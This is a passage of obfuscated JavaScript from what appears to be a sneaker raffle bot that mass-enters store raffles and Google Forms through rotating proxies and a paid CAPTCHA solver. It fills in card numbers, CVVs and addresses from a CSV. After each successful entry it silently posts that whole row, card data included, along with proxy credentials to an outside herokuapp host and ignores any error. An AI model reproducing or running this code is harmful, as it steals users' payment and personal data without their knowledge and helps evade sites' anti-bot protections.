                        await _0x156e87['type']('input[name=\x22lastName\x22]', '' + _0x645c58[_0x54f293]['LastName']), await _0x1d2efb(0xc8), await _0x156e87['type']('input[name=\x22instagramUsername\x22]', '' + _0x645c58[_0x54f293]['Follower']), await _0x1d2efb(0x4b0), await _0x156e87['click']('button.btn.continue-button__1RtsS'), await _0x1d2efb(0x3e8), console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x156e87['select']('select[name=\x22country\x22]', '' + _0x645c58[_0x54f293]['Country']), await _0x1d2efb(0x2bc), await _0x156e87['type']('input[name=\x22streetName\x22]', '' + _0x645c58[_0x54f293]['Address1']), await _0x1d2efb(0x258), await _0x156e87['type']('input[name=\x22houseNumber\x22]', _0x645c58[_0x54f293]['HouseNumber'] + '\x20' + _0x645c58[_0x54f293]['Address2']), await _0x1d2efb(0xc8), await _0x156e87['type']('input[name=\x22postalCode\x22]', '' + _0x645c58[_0x54f293]['Zip']), await _0x1d2efb(0x1f4), await _0x156e87['type']('input[name=\x22city\x22]', '' + _0x645c58[_0x54f293]['City']), await _0x1d2efb(0x4b0), await _0x156e87['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x1d2efb(0x4b0), await _0x156e87['click']('button.btn.continue-button__1RtsS'), await _0x1d2efb(0x4b0), console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x156e87['solveRecaptchas'](), console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x1d2efb(0xbb8), await _0x156e87['click']('button.btn.continue-button__1RtsS'), await _0x1d2efb(0x1388), console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x156e87['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x156e87['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d2efb(0x4b0), await _0x156e87['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x645c58[_0x54f293]['CardNumber']), await _0x1d2efb(0x320), await _0x156e87['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x156e87['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x645c58[_0x54f293]['ExpiryDate']), await _0x1d2efb(0x4b0), await _0x156e87['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x156e87['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x645c58[_0x54f293]['CVV']), await _0x1d2efb(0x226), await _0x156e87['type']('input[name=\x22holderName\x22]', '' + _0x645c58[_0x54f293]['NameOnCard']), await _0x1d2efb(0x226), await _0x156e87['click']('button.adyen-checkout__button'), console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x156e87['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x1d2efb(0xbb8);
                        } catch (_0x3224ff) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x203DS\x20Failed')), _0x2680e7 = '3DS\x20Error\x20' + _0x3224ff;
                            var _0x2ecccd = await _0x3aa619(_0x645c58[_0x54f293], _0xc8276a, 'dev', !![], _0x2680e7);
                            _0x282ce2['errorDEV'] = { 'embeds': [_0x2ecccd] };
                            _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x282ce2['errorDEV']);
                            await _0x471d59(_0x32fdb9, _0x282ce2['errorDEV']);
                            continue;
                        }
                        _0x21396e(_0x645c58[_0x54f293], _0xc8276a), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x5e2096 = _0x645c58[_0x54f293];
                        try {
                            prxdata = {
                                'username': _0x3919f0['replace']('#', ''),
                                'module': _0xc8276a['name'],
                                'entrydata': JSON['stringify'](_0x5e2096),
                                'proxy': '' + _0x3c1f19[_0x54f293]
                            };
                            var _0xe9bbe1 = JSON['stringify'](prxdata);
                            let _0x2b4134 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0xe9bbe1, _0x2b4134);
                        } catch (_0x244d5e) {
                        }
                        if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                            try {
                                await _0x471d59(_0x6a12f3['webhook'], _0x282ce2['succesDEVMSG']);
                            } catch {
                            }
                        await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x282ce2['succesDEVMSG']), await _0x1d2efb(0xc8);
                        try {
                            await _0x471d59(_0x1d6d5c, _0x282ce2['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x109fb1) {
                        console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20' + _0x109fb1), _0x2680e7 = '' + _0x109fb1;
                        var _0x2ecccd = await _0x3aa619(_0x645c58[_0x54f293], _0xc8276a, 'dev', !![], _0x2680e7);
                        _0x282ce2['errorDEV'] = { 'embeds': [_0x2ecccd] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x282ce2['errorDEV']), await _0x471d59(_0x32fdb9, _0x282ce2['errorDEV']), _0x4dddba = 'yes';
                    } finally {
                        _0x52a83a['close']();
                        if (_0x4dddba == 'yes' && _0x5ecd != 0x5) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5ecd + '\x20/\x205)')), _0x54f293 = _0x54f293 - 0x1, _0x5ecd = _0x5ecd + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x2f2a71, _0x52756d, _0x264be8) {
                let _0xd56aca = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                }, _0xc297da = 0x0, _0x3dbac9 = 0x0;
                function _0x54ce49(_0x65165f) {
                    console['log'](_0x24cf02() + '\x20[' + _0x2f2a71['name'] + ']\x20Task\x20' + (_0x45815c + 0x1) + '\x20:\x20' + _0x65165f);
                }
                _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x6a12f3['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x45815c = 0x0; _0x45815c < _0x52756d['length']; _0x45815c++) {
                    var _0x41ecef;
                    if (_0x15e44a != 'yes') {
                        if (!_0x15e44a)
                            var _0x15e44a = '';
                        else
                            _0x15e44a = '';
                        var _0x3343cc = 0x0;
                    }
                    try {
                        await _0x3cf8c0(_0x52756d, _0x45815c);
                    } catch {
                        _0x15e44a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x52756d[_0x45815c]['Email'] == '' || _0x52756d[_0x45815c]['FirstName'] == '' || _0x52756d[_0x45815c]['LastName'] == '' || _0x52756d[_0x45815c]['Country'] == '' || _0x52756d[_0x45815c]['Size'] == '' || _0x52756d[_0x45815c]['Address1'] == '' || _0x52756d[_0x45815c]['Zip'] == '') {
                        console['log'](_0x24cf02() + '\x20[' + _0x2f2a71['name'] + ']\x20Task\x20' + (_0x45815c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x6a12f3['useRandomProxy'] = ![])
                        var _0x6f0494 = _0x264be8[_0x45815c]['split'](':');
                    else
                        var _0x586043 = Math['round'](Math['random']() * (_0x264be8['length'] - 0x1)), _0x6f0494 = _0x264be8[_0x586043]['split'](':');
                    var _0xcffddc;
                    if (_0x6f0494['length'] == 0x1)
                        try {
                            _0xcffddc = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xcffddc = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0xcffddc = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x6f0494[0x0] + ':' + _0x6f0494[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xcffddc = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x6f0494[0x0] + ':' + _0x6f0494[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x1245c5 = { 'first': ![] };
                        const _0x6d2b63 = await _0xcffddc['newPage']();
                        if (_0x6f0494['length'] != 0x0)
                            await _0x6d2b63['authenticate']({
                                'username': '' + _0x6f0494[0x2],
                                'password': '' + _0x6f0494[0x3]
                            });
                        await _0x6d2b63['setExtraHTTPHeaders']({ 'Accept-Language': 'en' }), _0x54ce49('Getting\x20Session'), await _0x6d2b63['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x6d2b63['setRequestInterception'](!![]), _0x6d2b63['on']('request', _0x416a16 => {
                            _0x416a16['resourceType']() === 'image' || _0x416a16['resourceType']() === 'font' || _0x416a16['resourceType']() === 'media' ? _0x416a16['abort']() : _0x416a16['continue']();
                        });
                        try {
                            await _0x6d2b63['goto'](_0x52756d[_0x45815c]['Url'], { 'waitUntil': 'networkidle0' }), await _0x1d2efb(0xbb8), await _0x6d2b63['waitForSelector']('.teQAzf');
                        } catch (_0x31167d) {
                            throw new Error(_0x31167d);
                        }
                        let _0x2a5c3d = await _0x6d2b63['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                        for (question of _0x2a5c3d) {
                            let _0x11eced = await question['$eval']('.M7eMe', _0x758e6d => _0x758e6d['textContent']);
                            if (_0xc297da != 0x0) {
                                let _0xd8d102 = ![];
                                for (let _0x8eb200 = 0x0; _0x8eb200 < _0xc297da; _0x8eb200++) {
                                    if (_0x11eced == _0xd56aca['custom' + _0x8eb200]['title']) {
                                        _0x54ce49('Custom\x20Selector\x20found;\x20' + _0x11eced);
                                        let _0x145df4 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x3e2456 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x145df4)
                                            await _0x145df4['type']('' + _0xd56aca['custom' + _0x8eb200]['answer']);
                                        else
                                            _0x3e2456 && await _0x3e2456['type']('' + _0xd56aca['custom' + _0x8eb200]['answer']);
                                        _0xd8d102 = !![];
                                        break;
                                    }
                                }
                                if (_0xd8d102) {
                                    await _0x1d2efb(0x15e);
                                    continue;
                                }
                            }
                            try {
                                if (_0x11eced == _0xd56aca['0Select']['title']) {
                                    _0x54ce49('Custom\x20Selector\x20found;\x20' + _0xd56aca['0Select']['title']);
                                    let _0x35b1b6 = await question['$$']('.ulDsOb'), _0x38bff2 = await _0x35b1b6[_0xd56aca['0Select']['answer']];
                                    await _0x38bff2['click']();
                                    continue;
                                }
                                if (_0x11eced == _0xd56aca['1Select']['title']) {
                                    _0x54ce49('Custom\x20Selector\x20found;\x20' + _0xd56aca['1Select']['title']);
                                    let _0x1416c4 = await question['$$']('.ulDsOb'), _0x30427a = await _0x1416c4[_0xd56aca['1Select']['answer']];
                                    await _0x30427a['click']();
                                    continue;
                                }
                                if (_0x11eced == _0xd56aca['2Select']['title']) {
                                    _0x54ce49('Custom\x20Selector\x20found;\x20' + _0xd56aca['2Select']['title']);
                                    let _0x515b08 = await question['$$']('.ulDsOb'), _0x304a45 = await _0x515b08[_0xd56aca['2Select']['answer']];
                                    await _0x304a45['click']();
                                    continue;
                                }
                            } catch (_0xdb89ee) {
                            }
                            if (_0x11eced['toLowerCase']()['includes']('mail') && !_0x11eced['toLowerCase']()['includes']('agree') || _0x11eced == _0xd56aca['Email']) {
                                _0x54ce49('Mail\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x2b761b = await question['$']('input');
                                !_0x2b761b && (_0x2b761b = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                await _0x2b761b['type'](_0x52756d[_0x45815c]['Email']), await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('first') || _0x11eced['toLowerCase']() == 'name' || _0x11eced['toLowerCase']() == 'name\x20' || _0x11eced == _0xd56aca['FirstName']) {
                                _0x54ce49('FirstName\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x4be4c1 = await question['$']('input');
                                !_0x4be4c1 && (_0x4be4c1 = await question['$']('textarea'));
                                await _0x4be4c1['type'](_0x52756d[_0x45815c]['FirstName'] + '\x20'), await _0x1d2efb(0x258);
                                if (_0x11eced == _0xd56aca['FirstName'])
                                    continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('last') || _0x11eced['toLowerCase']()['includes']('surname') || _0x11eced == _0xd56aca['LastName']) {
                                _0x54ce49('LastName\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x25c9bc = await question['$']('input');
                                !_0x25c9bc && (_0x25c9bc = await question['$']('textarea'));
                                await _0x25c9bc['type'](_0x52756d[_0x45815c]['LastName'] + '\x20'), await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('address') && !_0x11eced['toLowerCase']()['includes']('agree') || _0x11eced == _0xd56aca['Address']) {
                                _0x54ce49('Address\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x45f775 = await question['$']('input');
                                !_0x45f775 && (_0x45f775 = await question['$']('textarea'));
                                await _0x45f775['type'](_0x52756d[_0x45815c]['Address1'] + '\x20' + _0x52756d[_0x45815c]['HouseNumber'] + '\x20' + _0x52756d[_0x45815c]['Address2']), await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('phone') || _0x11eced['toLowerCase']()['includes']('mobile') || _0x11eced == _0xd56aca['Phone']) {
                                _0x54ce49('Phone\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x4c3fd4 = await question['$']('input');
                                !_0x4c3fd4 && (_0x4c3fd4 = await question['$']('textarea'));
                                await _0x4c3fd4['type']('' + _0x52756d[_0x45815c]['Phone']), await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('country') || _0x11eced == _0xd56aca['Country']) {
                                let _0x2af88b = await question['$']('div[jsname=\x22wCJL8\x22]');
                                if (_0x2af88b) {
                                    let _0xd87b7c = ![], _0x10cdd7 = await _0x2af88b['$$']('.ulDsOb');
                                    for (option of _0x10cdd7) {
                                        let _0x3ce451 = await option['$']('span'), _0x2e72a3 = await option['$eval']('span', _0x130cdc => _0x130cdc['textContent']);
                                        if (_0x2e72a3['toLowerCase']() == _0x52756d[_0x45815c]['Country']['toLowerCase']()) {
                                            await _0x3ce451['click'](), _0xd87b7c = !![];
                                            break;
                                        }
                                    }
                                    if (!_0xd87b7c) {
                                        const _0x1f3301 = await question['$']('.Hvn9fb.zHQkBf');
                                        await _0x1f3301['click'](), await _0x1f3301['type'](_0x52756d[_0x45815c]['Country']);
                                    }
                                    continue;
                                }
                                _0x54ce49('Country\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x54788f = await question['$']('input');
                                !_0x54788f && (_0x54788f = await question['$']('textarea'));
                                await _0x54788f['type']('' + _0x52756d[_0x45815c]['Country']), await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('city') || _0x11eced == _0xd56aca['City']) {
                                _0x54ce49('City\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x20682f = await question['$']('input');
                                !_0x20682f && (_0x20682f = await question['$']('textarea'));
                                await _0x20682f['type']('' + _0x52756d[_0x45815c]['City']), await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('zip') || _0x11eced == _0xd56aca['Zip']) {
                                _0x54ce49('Zip\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x523013 = await question['$']('input');
                                !_0x523013 && (_0x523013 = await question['$']('textarea'));
                                await _0x523013['type']('' + _0x52756d[_0x45815c]['Zip']), await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('insta') || _0x11eced == _0xd56aca['Follower']) {
                                _0x54ce49('Follower\x20Selector\x20found;\x20' + _0x11eced);
                                let _0xa1c774 = await question['$']('input');
                                !_0xa1c774 && (_0xa1c774 = await question['$']('textarea'));
                                await _0xa1c774['type']('' + _0x52756d[_0x45815c]['Follower']), await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('size') || _0x11eced == _0xd56aca['Size']) {
                                _0x54ce49('Size\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x1c360e = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x1c360e) {
                                    let _0x162204 = await _0x1c360e['$$']('.ulDsOb');
                                    for (size of _0x162204) {
                                        let _0x4b93d8 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x402d12 => _0x402d12['textContent']);
                                        if (_0x4b93d8['toLowerCase']()['includes'](_0x52756d[_0x45815c]['Size'])) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                let _0x4bbf30 = await question['$']('.ry3kXd');
                                if (_0x4bbf30) {
                                    await _0x4bbf30['click'](), await _0x1d2efb(0x9c4);
                                    let _0x11ae19 = await _0x6d2b63['$']('div[jsname=\x22V68bde\x22]'), _0x24a362 = await _0x11ae19['$$']('div[jsname=\x22wQNmvb\x22]');
                                    for (size of _0x24a362) {
                                        let _0x2c01fd = await size['$eval']('.vRMGwf.oJeWuf', _0x53d7c8 => _0x53d7c8['textContent']), _0x4d0cb2 = await size['$']('.vRMGwf.oJeWuf');
                                        if (_0x2c01fd['toLowerCase']()['includes'](_0x52756d[_0x45815c]['Size'])) {
                                            await _0x1d2efb(0x190), await _0x4d0cb2['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('receive') || _0x11eced['toLowerCase']()['includes']('method')) {
                                _0x54ce49('Method\x20Selector\x20found;\x20' + _0x11eced);
                                let _0x479880 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x479880) {
                                    const _0x1e3e01 = await _0x479880['$$']('.ulDsOb');
                                    for (size of _0x1e3e01) {
                                        let _0x1ce833 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x20c045 => _0x20c045['textContent']);
                                        if (_0x1ce833['toLowerCase']()['includes']('shipping')) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x1d2efb(0x258);
                                continue;
                            }
                            if (_0x11eced['toLowerCase']()['includes']('offers') || _0x11eced['toLowerCase']()['includes']('agree')) {
                                _0x54ce49('Authorization\x20Selector\x20found;\x20' + _0x11eced);
                                const _0x4f5eaa = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x4f5eaa) {
                                    const _0x374d19 = await _0x4f5eaa['$$']('.ulDsOb');
                                    for (size of _0x374d19) {
                                        let _0x491675 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x290658 => _0x290658['textContent']);
                                        if (_0x491675['toLowerCase']()['includes']('authorize') || _0x491675['toLowerCase']()['includes']('yes')) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x1d2efb(0x258);
                                continue;
                            }
                            async function _0x4a8941() {
                                let _0x379d11 = await question['$']('.oyXaNc');
                                if (_0x379d11) {
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1b5f76['cyan'](_0x11eced) + '\x0a');
                                    let _0x594d79 = await question['$$']('.ulDsOb');
                                    for (let _0x335320 = 0x0; _0x335320 < _0x594d79['length']; _0x335320++) {
                                        let _0x28eb45 = await _0x594d79[_0x335320]['$eval']('span', _0x231f66 => _0x231f66['textContent']);
                                        console['log']('\x20(' + _0x335320 + ')\x20' + _0x28eb45);
                                    }
                                    console['log']();
                                    let _0x4b4c41 = await _0x15dd71['get']('option'), _0x53218a = await _0x594d79[_0x4b4c41['option']]['$eval']('span', _0x837163 => _0x837163['textContent']);
                                    _0xd56aca[_0x3dbac9 + 'Select'] = {
                                        'title': _0x11eced,
                                        'answer': _0x4b4c41['option']
                                    };
                                    let _0x23204a = await _0x594d79[_0x4b4c41['option']]['$']('span');
                                    await _0x23204a['click'](), _0x3dbac9++;
                                    return;
                                }
                                let _0x452b92 = await question['$']('.Y6Myld');
                                if (_0x452b92) {
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1b5f76['cyan'](_0x11eced) + '\x0a');
                                    let _0x527dfe = await question['$$']('.ulDsOb');
                                    for (let _0x1550c4 = 0x0; _0x1550c4 < _0x527dfe['length']; _0x1550c4++) {
                                        let _0x35ae93 = await _0x527dfe[_0x1550c4]['$eval']('span', _0x108686 => _0x108686['textContent']);
                                        console['log']('\x20(' + _0x1550c4 + ')\x20' + _0x35ae93);
                                    }
                                    console['log']();
                                    let _0x104b8a = await _0x15dd71['get']('option');
                                    _0xd56aca[_0x3dbac9 + 'Select'] = {
                                        'title': _0x11eced,
                                        'answer': _0x104b8a['option']['split'](',')
                                    };
                                    for (opt of _0xd56aca[_0x3dbac9 + 'Select']['answer']) {
                                        let _0x4abcc0 = await _0x527dfe[opt]['$']('span');
                                        await _0x4abcc0['click']();
                                    }
                                    _0x3dbac9++;
                                    return;
                                }
                                var _0x6a2675 = 0x0;
                                let _0x17564a = Object['keys'](_0xd56aca);
                                console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1b5f76['cyan'](_0x11eced) + '\x0a');
                                for (data of _0x17564a) {
                                    !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x6a2675 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x6a2675 + ')\x20' + data), _0x6a2675++;
                                }
                                console['log']('\x20(' + _0x17564a['length'] + ')\x20Custom\x20input:'), console['log']();
                                let _0x243588 = await _0x15dd71['get']('input');
                                if (_0x243588['input'] == _0x17564a['length']) {
                                    console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                    let _0x256046 = await _0x15dd71['get']('input');
                                    _0xd56aca['custom' + _0xc297da] = {
                                        'title': _0x11eced,
                                        'answer': _0x256046['input']
                                    };
                                    let _0x332a2a = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x4c8686 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    if (_0x332a2a)
                                        await _0x332a2a['type']('' + _0xd56aca['custom' + _0xc297da]['answer']);
                                    else
                                        _0x4c8686 && await _0x4c8686['type']('' + _0xd56aca['custom' + _0xc297da]['answer']);
                                    _0xc297da++;
                                    return;
                                }
                                _0xd56aca['' + _0x17564a[_0x243588['input']]] = _0x11eced;
                                let _0x4bad59 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x1af9cb = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                _0x4bad59 && await _0x4bad59['type']('' + _0x52756d[_0x45815c]['' + _0x17564a[_0x243588['input']]]), _0x1af9cb && await _0x1af9cb['type']('' + _0x52756d[_0x45815c]['' + _0x17564a[_0x243588['input']]]), await _0x1d2efb(0x258);
                            }
                            await _0x4a8941(), await _0x1d2efb(0x37a);
                        }
                        await _0x6d2b63['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x6d2b63['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x21396e(_0x52756d[_0x45815c], _0x2f2a71), _0x15e44a = 'no';
                        var _0x4cd81b = await _0x3aa619(_0x52756d[_0x45815c], _0x2f2a71, 'dev', ![]), _0xcd50b8 = await _0x3aa619(_0x52756d[_0x45815c], _0x2f2a71, 'pub', ![]);
                        let _0x33cf64 = _0x52756d[_0x45815c];
                        try {
                            prxdata = {
                                'username': _0x3919f0['replace']('#', ''),
                                'module': _0x2f2a71['name'],
                                'entrydata': JSON['stringify'](_0x33cf64),
                                'proxy': '' + _0x264be8[_0x45815c]
                            };
                            var _0x18dec3 = JSON['stringify'](prxdata);
                            let _0x105c08 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x18dec3, _0x105c08);
                        } catch (_0x1b2a8e) {
                        }
                        const _0x497ba6 = {
                            'succesDEVMSG': { 'embeds': [_0x4cd81b] },
                            'succesPUBMSG': { 'embeds': [_0xcd50b8] }
                        };
                        try {
                            _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x497ba6['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x497ba6['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x1d6d5c, _0x497ba6['succesPUBMSG']);
                        } catch (_0x18cbb1) {
                            console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x45815c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x18cbb1));
                        }
                        console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x2f2a71['name'] + ']\x20Task\x20' + (_0x45815c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                    } catch (_0x5a5de2) {
                        console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x2f2a71['name'] + ']\x20Task\x20' + (_0x45815c + 0x1) + '\x20:\x20' + _0x5a5de2)), _0x41ecef = '' + _0x5a5de2;
                        var _0x41079e = await _0x3aa619(_0x52756d[_0x45815c], _0x2f2a71, 'dev', !![], _0x41ecef);
                        let _0x16e58a = {};
                        _0x16e58a['errorDEV'] = { 'embeds': [_0x41079e] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x16e58a['errorDEV']), await _0x471d59(_0x32fdb9, _0x16e58a['errorDEV']), _0x15e44a = 'yes';
                    } finally {
                        _0xcffddc && _0xcffddc['close']();
                        if (_0x15e44a == 'yes' && _0x3343cc != 0x5) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x2f2a71['name'] + ']\x20Task\x20' + (_0x45815c + 0x1) + '\x20:\x20Retrying\x20(' + _0x3343cc + '\x20/\x205)')), _0x45815c = _0x45815c - 0x1, _0x3343cc = _0x3343cc + 0x1;
                            continue;
                        }
                        if (_0x15e44a == 'yes' && _0x3343cc == 0x5) {
                            _0x3343cc = 0x0, _0x15e44a = 'no';
                            continue;
                        }
                        _0x54ce49('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0xcbd097, _0x21665d, _0x20e3cb) {
                var _0x31228e = ![], _0x177a87 = ![];
                if (_0x6a12f3['captchaKey'] == '' || _0x6a12f3['captchaKey'] == undefined)
                    return console['log'](_0x1b5f76['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x6a12f3['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x160d1f = 0x0; _0x160d1f < _0x21665d['length']; _0x160d1f++) {
                    if (_0x36ab58 != 'yes')
